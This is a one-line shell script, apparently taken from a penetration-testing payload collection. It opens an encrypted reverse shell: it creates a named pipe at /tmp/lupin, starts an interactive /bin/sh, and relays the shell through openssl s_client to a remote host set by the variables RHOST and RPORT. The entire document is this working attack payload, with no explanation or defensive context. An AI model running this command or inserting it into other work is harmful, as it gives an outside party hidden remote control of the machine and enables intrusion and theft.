#!/bin/sh

 mkfifo /tmp/lupin; /bin/sh -i < /tmp/lupin 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/lupin; rm /tmp/lupin
